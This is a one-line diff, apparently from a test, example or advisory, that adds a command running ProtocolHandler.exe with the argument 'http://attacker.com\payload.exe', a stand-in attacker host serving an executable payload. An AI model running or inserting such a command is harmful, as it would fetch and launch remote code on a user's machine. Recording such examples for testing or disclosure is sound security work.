@@ -1,0 +1,1 @@
+ProtocolHandler.exe "http://attacker.com\payload.exe"
